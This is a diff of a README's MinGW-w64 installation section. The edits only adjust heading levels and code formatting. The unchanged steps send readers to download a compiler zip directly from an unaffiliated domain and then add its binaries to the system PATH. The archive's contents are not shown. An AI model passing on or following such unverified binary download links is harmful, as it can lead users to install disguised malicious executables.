@@ -47,13 +47,13 @@ int main() {
 
 ## How to install the MinGW-w64 
 
-#### Download the MinGW-w64 archive:
+### Download the MinGW-w64 archive:
 Click here to download the zip file directly from our server: [Direct Download Link](https://aranag.site/download/MinGW64.zip)
 
-#### Extract the archive:
-Once the download is complete, extract the contents of the MinGW64.zip file to a location on your computer. We recommend a simple path like C:\MinGW64.
+### Extract the archive:
+Once the download is complete, extract the contents of the MinGW64.zip file to a location on your computer. We recommend a simple path like `C:\MinGW64`.
 
-#### Add to your system's PATH:
+### Add to your system's PATH:
 To use the tools from any command prompt, you need to add the bin directory to your system's PATH environment variable.
 
 Open the Start Menu and search for `Edit the system environment variables`.
@@ -66,7 +66,7 @@ Click `New` and add the path to the bin directory of your MinGW-w64 installation
 
 Click `OK` on all windows to save the changes.
 
-#### Verify the installation:
+### Verify the installation:
 Open a new Command Prompt or PowerShell window and type `gcc --version`. If the installation was successful, you should see the version information for the GCC compiler.
 
 ---
